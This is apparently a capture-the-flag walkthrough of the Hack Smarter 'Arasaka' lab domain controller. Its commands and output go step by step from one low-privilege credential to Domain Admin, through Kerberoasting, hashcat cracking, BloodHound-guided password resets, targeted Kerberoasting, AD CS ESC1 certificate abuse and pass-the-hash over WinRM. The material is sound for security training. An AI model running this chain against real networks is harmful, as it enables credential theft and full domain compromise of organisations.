---
title: "Arasaka (Hack Smarter) — Walkthrough: Kerberoast → ACL Abuse → AD CS ESC1 → Domain Admin"
description: "Hack Smarter Arasaka walkthrough — full assumed-breach AD chain: Kerberoast, BloodHound-guided ForceChangePassword and targeted Kerberoast, then AD CS ESC1 to Domain Admin."
date: 2026-09-07 09:00:00 +0000
categories: [CTF]
tags: [ctf, hacksmarter, windows, active-directory, kerberoast, bloodhound, adcs, esc1, acl-abuse, domain-admin]
difficulty: Hard
---

> **Box:** Hack Smarter — Arasaka · **OS:** Windows Server 2022 · **Theme:** Assumed-breach AD → Kerberoast → ACL abuse → AD CS ESC1 → DA

Assumed-breach AD box (`hacksmarter.local`, single DC, Cyberpunk-themed). Full chain: **Kerberoast → BloodHound-guided ACL abuse → targeted Kerberoast → AD CS ESC1 → Domain Admin.** Started with one low-priv credential, finished with `root.txt`.

- **Target:** `10.1.149.144` (`DC01.hacksmarter.local`)
- **Given creds:** `faraday:hacksmarter123`

---

## Recon

```bash
┌──(kali㉿kali)-[~/Desktop/Hack Smarter/Arasaka]
└─$ rustscan -a 10.1.149.144 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.

Open 10.1.149.144:53,88,135,139,389,445,464,593,636,3389,5985,9389

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: hacksmarter.local)
|_ssl-cert: commonName=DC01.hacksmarter.local  |  Issuer: hacksmarter-DC01-CA
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows AD LDAP
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hacksmarter.local
|   DNS_Computer_Name: DC01.hacksmarter.local
|_  Product_Version: 10.0.20348
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing

Host script results:
| smb2-security-mode:
|_    Message signing enabled and required
Service Info: Host: DC01; OS: Windows Server 2022 Build 20348
```

Textbook domain controller — DNS/Kerberos/LDAP/GC, plus **WinRM (5985)** and **RDP (3389)**. Domain is `hacksmarter.local`, host `DC01`, Server 2022. The LDAP cert issuer `hacksmarter-DC01-CA` tells me **AD CS is in play**. WinRM being open means any account I recover could give me a shell.

---

## Enumeration

Synced clock to the DC first — Kerberos is fussy about time skew:

```bash
└─$ sudo ntpdate 10.1.149.144
2026-09-06 16:29:33.610417 (+0000) +0.351166 +/- 0.119508 10.1.149.144 s4 no-leap
```

Validated the given credential, then dumped domain users:

```bash
└─$ nxc smb hacksmarter.local -u faraday -p 'hacksmarter123'
SMB  10.1.149.144  445  DC01  [+] hacksmarter.local\faraday:hacksmarter123

└─$ nxc smb 10.1.149.144 -u faraday -p 'hacksmarter123' --users | awk '...' > usernames.txt

└─$ cat usernames.txt
Administrator
Guest
krbtgt
Goro
alt.svc
Yorinobu
Hanako
Faraday
Smasher
Soulkiller.svc
Hellman
kei.svc
Silverhand.svc
Oda
the_emperor
```

Confirmed 13 of 15 valid with kerbrute:

```bash
└─$ kerbrute userenum -d hacksmarter.local --dc 10.1.149.144 usernames.txt

[+] VALID USERNAME:  Yorinobu@hacksmarter.local
[+] VALID USERNAME:  Administrator@hacksmarter.local
[+] VALID USERNAME:  Goro@hacksmarter.local
[+] VALID USERNAME:  Smasher@hacksmarter.local
[+] VALID USERNAME:  alt.svc@hacksmarter.local
[+] VALID USERNAME:  Faraday@hacksmarter.local
[+] VALID USERNAME:  Hanako@hacksmarter.local
[+] VALID USERNAME:  Soulkiller.svc@hacksmarter.local
[+] VALID USERNAME:  Oda@hacksmarter.local
[+] VALID USERNAME:  Silverhand.svc@hacksmarter.local
[+] VALID USERNAME:  the_emperor@hacksmarter.local
[+] VALID USERNAME:  Hellman@hacksmarter.local
[+] VALID USERNAME:  kei.svc@hacksmarter.local
Done! Tested 15 usernames (13 valid) in 5.631 seconds
```

---

## Kerberoasting

`faraday` can request service tickets. Roasted — one SPN account returned: `alt.svc`:

```bash
└─$ impacket-GetUserSPNs 'hacksmarter.local/faraday:hacksmarter123' -dc-ip 10.1.149.144
ServicePrincipalName            Name     PasswordLastSet
------------------------------  -------  --------------------------
AI/blackwall.hacksmarter.local  alt.svc  2025-09-21 15:07:42.894050

└─$ impacket-GetUserSPNs 'hacksmarter.local/faraday:hacksmarter123' -dc-ip 10.1.149.144 -request -outputfile kerberoast.txt
$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local/alt.svc*$764063a9d78ff16f...[snip]
```

Cracked with rockyou:

```bash
└─$ hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$...[snip]:babygirl1

Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Recovered........: 1/1 (100.00%)
```

**→ `alt.svc:babygirl1`**

---

## BloodHound

Collected with `faraday` to map the path forward:

```bash
└─$ nxc ldap hacksmarter.local -u faraday -p 'hacksmarter123' --bloodhound --collection All --dns-server 10.1.149.144
LDAP  10.1.149.144  389  DC01  Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP  10.1.149.144  389  DC01  Bloodhound data collection completed in 1M 17S
LDAP  10.1.149.144  389  DC01  Found 34 certificate templates
LDAP  10.1.149.144  389  DC01  Found 1 Enterprise CAs
```

BloodHound revealed the attack path:

**`alt.svc`** ─ForceChangePassword→ **`Yorinobu`** ─GenericWrite→ **`Soulkiller.svc`** → AD CS ESC1 → DA

---

## alt.svc → Yorinobu (ForceChangePassword)

`alt.svc` has the right to force-reset `Yorinobu`'s password:

```bash
└─$ bloodyAD --host 10.1.149.144 -d hacksmarter.local -u 'alt.svc' -p 'babygirl1' set password Yorinobu 'Yorinobu@123!'
[+] Password changed successfully!

└─$ nxc smb 10.1.149.144 -u 'Yorinobu' -p 'Yorinobu@123!' --shares
SMB  10.1.149.144  445  DC01  [+] hacksmarter.local\Yorinobu:Yorinobu@123!
```

---

## Yorinobu → Soulkiller.svc (Targeted Kerberoast)

`Yorinobu` has GenericWrite over `Soulkiller.svc`, which means I can write an SPN to it and Kerberoast it. `targetedKerberoast.py` automates the write → roast → cleanup:

```bash
└─$ python3 targetedKerberoast.py -d hacksmarter.local -u 'Yorinobu' -p 'Yorinobu@123!' -v
[VERBOSE] SPN added successfully for (Soulkiller.svc)
[+] Printing hash for (Soulkiller.svc)
$krb5tgs$23$*Soulkiller.svc$HACKSMARTER.LOCAL$...[snip]
[VERBOSE] SPN removed successfully for (Soulkiller.svc)

└─$ hashcat -m 13100 soulkiller.hash /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*Soulkiller.svc$...[snip]:MYpassword123#

Status...........: Cracked
Recovered........: 1/1 (100.00%)
```

**→ `Soulkiller.svc:MYpassword123#`**

---

## Soulkiller.svc → Domain Admin (AD CS ESC1)

Validated `Soulkiller.svc`, then scanned for vulnerable cert templates:

```bash
└─$ certipy-ad find -u soulkiller.svc@hacksmarter.local -p 'MYpassword123#' -dc-ip 10.1.149.144 -vulnerable
[*] Found 34 certificate templates
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
```

The `AI_Takeover` template is **ESC1** — it allows the enrollee to supply an arbitrary UPN in the cert request (no manager approval, client auth EKU). Requested a cert as Administrator:

```bash
└─$ certipy-ad req -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.149.144 \
    -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'administrator@hacksmarter.local'
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@hacksmarter.local'
[*] Saving certificate and private key to 'administrator.pfx'

└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.149.144
[-] Got error while trying to request TGT: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)
```

Administrator's password is expired — PKINIT auth fails. Re-ran the same ESC1 request targeting `the_emperor` instead:

```bash
└─$ certipy-ad req -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.149.144 \
    -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local'

└─$ certipy-ad auth -pfx the_emperor.pfx -dc-ip 10.1.149.144
[*]     SAN UPN: 'THE_EMPEROR@hacksmarter.local'
[*] Got TGT
[*] Trying to retrieve NT hash for 'the_emperor'
[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133
```

---

## Domain Admin → root

`the_emperor`'s hash is `Pwn3d!` on the DC. Pass-the-hash into WinRM:

```bash
└─$ nxc smb 10.1.149.144 -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'
SMB  10.1.149.144  445  DC01  [+] hacksmarter.local\the_emperor:...d6789b133 (Pwn3d!)

└─$ evil-winrm -i 10.1.149.144 -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'
*Evil-WinRM* PS C:\Users\the_emperor\Documents>

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
fcf1dd0f08d1068a2f151fd2ec5ecf05
```

**root.txt:** `fcf1dd0f08d1068a2f151fd2ec5ecf05`

---

## TL;DR

- `faraday` (given) → enum users → **Kerberoast** → `alt.svc:babygirl1`
- **BloodHound**: `alt.svc` ─ForceChangePassword→ `Yorinobu` ─GenericWrite→ `Soulkiller.svc`
- Reset `Yorinobu` → **targeted Kerberoast** → `Soulkiller.svc:MYpassword123#`
- `Soulkiller.svc` enrolls in `AI_Takeover` template (**AD CS ESC1**) → cert as `the_emperor` → NT hash (Administrator cert was useless — expired password)
- `the_emperor` is Domain Admin → PtH → evil-winrm → `root.txt`
